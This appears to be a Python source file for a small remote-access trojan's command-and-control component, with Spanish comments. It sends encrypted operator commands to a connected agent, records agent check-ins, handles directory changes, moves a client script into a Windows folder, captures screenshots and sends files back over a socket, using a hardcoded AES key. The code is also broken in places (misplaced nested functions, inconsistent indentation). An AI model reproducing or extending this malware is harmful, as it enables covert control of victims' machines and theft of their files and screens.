import os
import mss
import shutil
import sys
from socket import socket

project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)
from crypto.aes_encryptor import AESEncryptor

class crocodile():
   def __init__(self):
        key=b"thisis16byteskey"
        self.encryptor = AESEncryptor(key)
        self.sessions = {} 

   def start(self, current_dir:socket):
        """Inicia el servidor y escucha check-ins de agentes.""" 
        while True:
          comand = input(current_dir).encode("utf-8")
          decrypted = self.encryptor.encrypt(comand.decode())
          current_dir.send(decrypted)
          print(decrypted)
          res = current_dir.recv(4096)
          if res:
            decrypted_response = self.encryptor.decrypt(res) 
            agent_id, command = self.process_check_in(decrypted_response)
            print(agent_id,command.decode())


   def process_check_in(self, data: str) -> tuple:
        """Procesa el check-in de un agente."""
        agent_id, metadata = data.split("|")
        self.sessions[agent_id] = metadata
        return agent_id, "collect_info" 

   def sh(self, res):
        CrocoRS = res.decode()
        if CrocoRS.startswith("cd"):
            if os.path.exists(CrocoRS[3:].encode()):
                os.chdir(CrocoRS[3:].encode())
                currendir = os.getcwd()
                encrypt = self.encryptor.encrypt(currendir)
                return encrypt
            else:
                result = b'not found or is a directory'
                encrypt = self.encryptor.encrypt(result)
                return encrypt
   def moving():
    archivo_origen = "./Client.py"
    directorio_destino = 'C:\Documentos'

    if not os.path.exists(directorio_destino):
        os.makedirs(directorio_destino)
    # Mover el archivo
    archivo_destino = os.path.join(directorio_destino, os.path.basename(archivo_origen))
    shutil.move(archivo_origen, archivo_destino)

    print(f"Archivo movido a: {archivo_destino}")

    def captura_pantalla():
        screen = mss.mss()
        screen.shot()

    def send_file(filename, server_socket):
        if os.path.exists(filename):
            server_socket.send(f"EXISTS {os.path.getsize(filename)}".encode('utf-8'))
            user_response = server_socket.recv(1024).decode('utf-8')
            if user_response[:2] == 'OK':
                with open(filename, 'rb') as f:
                    bytes_to_send = f.read(1024)
                    server_socket.send(bytes_to_send)
                    while bytes_to_send != b"":
                        bytes_to_send = f.read(1024)
                        server_socket.send(bytes_to_send)
        else:
            server_socket.send("ERR".encode('utf-8'))